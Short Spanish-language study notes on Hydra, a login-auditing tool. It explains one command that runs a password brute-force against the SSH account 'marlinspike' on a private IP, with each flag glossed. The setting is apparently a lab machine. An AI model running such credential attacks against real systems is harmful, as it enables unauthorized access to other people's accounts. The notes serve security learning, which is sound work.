# Hydra 
Es una herramienta de auditoría de inicio de sesión que trabaja con múltiples tareas en paralelo, soporta una gran variedad protocolos. Es muy rápido y flexible, y los nuevos módulos son fáciles de agregar. Esta herramienta permite a los investigadores y consultores de seguridad mostrar lo fácil que sería obtener acceso no autorizado a un sistema de forma remota. 

### Usos 
- Revertir el password de un usuario que tiene habilitado la conexion [[SSH]], obtiene el password del usuario.

#### Comandos
	man hydra
Muestra la opciones que nos provee la herramienta Hydra.

	hydra -l marlinspike -e nsr 192.168.1.68 ssh 
Realiza un ataque de fuerza bruta al usuario marlinspike de tipo login para obtener el password que utiliza para la conexion [[SSH].

-l marlinspike *Usuario victima que tiene permitido la conexion SSH*
-e nsr *cubre el password null, al igual que realiza reverse al password*
192.168.1.68 *IP privada de la maquina victima*
ssh *Protoloco que se utiliza para el login*

![Infografia Hydra](/Img/infografia-hydra.jpeg)

